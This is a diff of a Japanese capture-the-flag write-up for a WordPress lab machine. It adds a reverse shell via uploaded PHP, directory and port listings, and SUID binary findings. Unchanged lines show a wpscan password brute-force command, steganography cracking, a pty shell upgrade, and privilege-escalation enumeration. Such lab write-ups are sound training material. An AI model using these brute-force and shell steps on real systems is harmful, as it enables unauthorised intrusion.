@@ -70,7 +70,7 @@ $ wpscan --url http://adana.thm/ -e
  |  Login Error Messages (Aggressive Detection)
 ```
 
-ワードリストを使ってブルートフォースを書けたが空振り。
+ワードリストを使ってブルートフォースをかけたが空振り。
 
 ```sh
 wpscan --url http://adana.thm/ --passwords wordlist.txt --usernames hakanbey01
@@ -101,7 +101,7 @@ stegseek でワードリストを指定したらファイルが出てきた。
 $ stegseek ./austrailian-bulldog-ant.jpg ./wordlist.txt 
 StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
 
-[i] Found passphrase: "123adanaantinwar"
+[i] Found passphrase: "[REDACTED]"
 [i] Original filename: "user-pass-ftp.txt".
 [i] Extracting to "austrailian-bulldog-ant.jpg.out".
 ```
@@ -202,24 +202,66 @@ Twenty Nineteen の 404テンプレートをリバースシェルに書き換え
 
 次にMediaアップロードを試みたが、これも書き込み権限がないため普通のファイルもアップロードできない。
 
+phpmyadmin1 の wp_options にサブドメインが入っていた。hostsに追加。
 
+FTPでアップロードしたPHPを実行してリバースシェル取得成功。
 
+webフラグ発見。
 
-
-# 続きは後日
-
-
-
-
-
-
-
-
-
-
-
+```sh
+www-data@ubuntu:/$ ls -al /var/www/html
+total 236
+drwxrwxrwx  6 root     root      4096 Feb  7 23:04 .
+drwxrwxrwx  4 root     root      4096 Jan 14  2021 ..
+-rw-r--r--  1 www-data www-data   523 Jan 10  2021 .htaccess
+drwxr-xr-x  2 root     root      4096 Jan 11  2021 announcements
+-rw-r--r--  1 root     root       405 Feb  6  2020 index.php
+-rw-r--r--  1 root     root     19915 Feb 12  2020 license.txt
+-rw-r--r--  1 root     root      7278 Jun 26  2020 readme.html
+-rw-r--r--  1 root     root      7101 Jul 28  2020 wp-activate.php
+drwxr-xr-x  9 root     root      4096 Dec  8  2020 wp-admin
+-rw-r--r--  1 root     root       351 Feb  6  2020 wp-blog-header.php
+-rw-r--r--  1 root     root      2328 Oct  8  2020 wp-comments-post.php
+-rw-rw-rw-  1 www-data www-data  3193 Jan 10  2021 wp-config.php
+drwxr-xr-x  4 root     root      4096 Dec  8  2020 wp-content
+-rw-r--r--  1 root     root      3939 Jul 30  2020 wp-cron.php
+drwxr-xr-x 25 root     root     12288 Dec  8  2020 wp-includes
+-rw-r--r--  1 root     root      2496 Feb  6  2020 wp-links-opml.php
+-rw-r--r--  1 root     root      3300 Feb  6  2020 wp-load.php
+-rw-r--r--  1 root     root     49831 Nov  9  2020 wp-login.php
+-rw-r--r--  1 root     root      8509 Apr 14  2020 wp-mail.php
+-rw-r--r--  1 root     root     20975 Nov 12  2020 wp-settings.php
+-rw-r--r--  1 root     root     31337 Sep 30  2020 wp-signup.php
+-rw-r--r--  1 root     root      4747 Oct  8  2020 wp-trackback.php
+-rwxrwxrwx  1 hakanbey hakanbey    38 Jan 14  2021 [REDACTED].txt
+-rw-r--r--  1 root     root      3236 Jun  8  2020 xmlrpc.php
+```
 
 ## 権限昇格
+
+ローカルでリッスンしているのは、22と631ポート。
+
+```sh
+www-data@ubuntu:/tmp$ ss -nltp
+State                          Recv-Q                          Send-Q                                                     Local Address:Port                                                     Peer Address:Port                          
+LISTEN                         0                               80                                                             127.0.0.1:3306                                                          0.0.0.0:*                             
+LISTEN                         0                               128                                                        127.0.0.53%lo:53                                                            0.0.0.0:*                             
+LISTEN                         0                               128                                                            127.0.0.1:22                                                            0.0.0.0:*                             
+LISTEN                         0                               5                                                              127.0.0.1:631                                                           0.0.0.0:*                             
+LISTEN                         0                               128                                                                    *:80                                                                  *:*                             
+LISTEN                         0                               32                                                                     *:21                                                                  *:*                             
+LISTEN                         0                               5                                                                  [::1]:631                                                              [::]:*
+```
+
+## 権限昇格２
+
+hakanbeyグループのバイナリが2つあり、binary はSUIDが付いている。
+
+```sh
+hakanftp@ubuntu:/$ ls -al /usr/bin | grep hakanbey
+-r-srwx---  1 root   hakanbey    12984 Jan 14  2021 binary
+-rwxr-x---  1 root   hakanbey   238080 Nov  5  2017 find
+```
 
 ```sh
 # env_keep+=LD_PRELOAD は見落としがちなので注意
@@ -231,7 +273,7 @@ find / -perm -u=s -type f -ls 2>/dev/null
 ```
 
 ```sh
-find / -user <name> -type f -not -path "/proc/*" 2>/dev/null
+find / -user hakanbey -type f -not -path "/proc/*" 2>/dev/null
 find / -group <group> -type f -not -path "/proc/*" 2>/dev/null
 ```
 
@@ -246,7 +288,7 @@ cat /etc/exports
 
 ## 振り返り
 
--
+- サブドメインが気づきにくいが、11万件のリストを使ってファジングしていたら早期に気づけていたと思われる。
 -
 
 ## Tags
@@ -274,7 +316,7 @@ docker fail2ban modbus ルートキット gdbserver jar joomla MQTT CAPTCHA git 
 
 ```shell
 # python が無くても、python3 でいける場合もある
-python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
 
 # Ctrl+Z でバックグラウンドにした後に
